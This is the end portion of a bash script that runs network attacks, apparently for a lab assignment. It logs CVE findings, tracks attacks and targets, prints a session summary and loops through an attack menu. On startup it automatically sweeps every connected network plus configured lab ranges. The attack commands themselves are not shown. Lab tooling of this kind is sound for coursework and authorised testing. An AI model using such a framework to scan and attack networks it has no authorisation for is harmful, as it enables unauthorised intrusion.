        # count + the highest CVSS score so the key risk is visible at a glance.
        local cve_count
        cve_count=$(grep -oE 'CVE-[0-9]{4}-[0-9]+' "$EVIDENCE_FILE" 2>/dev/null | sort -u | wc -l)
        if (( cve_count > 0 )); then
            local max_cvss
            max_cvss=$(grep -oE 'CVE-[0-9]{4}-[0-9]+[[:space:]]+[0-9]+(\.[0-9])?' "$EVIDENCE_FILE" 2>/dev/null \
                       | grep -oE '[0-9]+(\.[0-9])?$' | sort -rn | head -1)
            ok "RESULT - ${cve_count} known CVEs found (max CVSS ${max_cvss:-n/a})"
        fi
        info "Full output saved to ${EVIDENCE_FILE}"
    fi

    # Session bookkeeping for the closing summary.
    ATTACKS_RUN=$(( ATTACKS_RUN + 1 ))
    TARGETS_HIT["$target"]=1

    ok "Attack '$name' completed against $target and recorded to the log."
}

# print_session_summary: a distinctive closing report so the operator (and the
# PDF) gets a clean recap instead of just scrolling tool output.
print_session_summary() {
    local tlist="none"
    (( ${#TARGETS_HIT[@]} > 0 )) && tlist="${!TARGETS_HIT[*]}"
    printf '\n%s+--- Session Summary --------------------------------------------+%s\n' "$BOLD" "$RESET"
    printf '  Attacks executed : %s\n' "$ATTACKS_RUN"
    printf '  Targets engaged  : %s\n' "$tlist"
    printf '  Audit log        : %s\n' "$LOG_FILE"
    printf '  Evidence folder  : %s\n' "$RESULTS_DIR"
    printf '%s+----------------------------------------------------------------+%s\n' "$BOLD" "$RESET"
}

###############################################################################
#  ENTRY POINT
###############################################################################

# main: orchestrates the whole run - banner, privilege/dependency checks, log
# init, host discovery, then an interactive loop that allows MULTIPLE attacks
# (each logged) until the user quits. Any invalid menu/target input terminates
# the program gracefully, per brief section 2.4.
main() {
    print_banner
    require_root
    check_dependencies
    init_log
    detect_networks            # enumerate every REAL connected IPv4 network
    show_network_overview      # show the operator what can be scanned
    # Auto-queue every directly-connected network PLUS the configured extra lab
    # networks (e.g. the routed 172.16.100.0/24 web-server segment), so all
    # reachable hosts are discovered on startup with no manual picking.
    SCAN_TARGETS=("${NET_CIDRS[@]}" "${EXTRA_NETWORKS[@]}")
    if (( ${#EXTRA_NETWORKS[@]} > 0 )); then
        info "Also sweeping configured lab network(s): ${EXTRA_NETWORKS[*]}"
    fi
    discover_ips               # silently sweep all queued network(s)
    report_discovered          # list what was found

    local sel idx target
    while true; do
        show_menu

        sel=$(select_attack) || die "Terminating on invalid input (brief 2.4)."
        if [[ $sel == "quit" ]]; then
            print_session_summary
            break
        fi
        idx=$sel

        target=$(select_target) || die "Terminating on invalid input (brief 2.4)."

        run_attack "$idx" "$target"
        # Loop straight back to the menu; the operator exits with the [q] option.
    done
}

main "$@"
